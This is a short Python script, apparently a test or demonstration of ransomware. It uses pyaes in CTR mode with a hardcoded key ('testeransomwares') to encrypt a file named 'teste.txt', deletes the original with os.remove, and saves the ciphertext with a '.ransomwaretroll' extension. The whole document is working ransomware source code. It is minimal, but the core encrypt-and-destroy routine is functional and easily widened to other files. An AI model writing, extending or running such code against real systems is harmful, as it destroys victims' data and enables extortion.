import os
import pyaes

def encrypt():
        encrypt_key = b"testeransomwares"
        file_name = "teste.txt"

        file_data = get_file_data(file_name)
        encrypt_data = get_encrypted_data(file_data, encrypt_key)
        create_encrypted_data(encrypt_data, file_name)

def get_file_data(file_name):
        file = open(file_name, "rb")
        file_data = file.read()
        file.close()
        return file_data

def get_encrypted_data(file_data, key):
        aes = pyaes.AESModeOfOperationCTR(key)
        return  aes.encrypt(file_data)

def create_encrypted_data(encrypt_data, file_name):
  os.remove(file_name)  
  new_file = file_name + ".ransomwaretroll"
  new_file = open(f'{new_file}','wb')
  new_file.write(encrypt_data)
  new_file.close()

if __name__ == "__main__":
  encrypt()
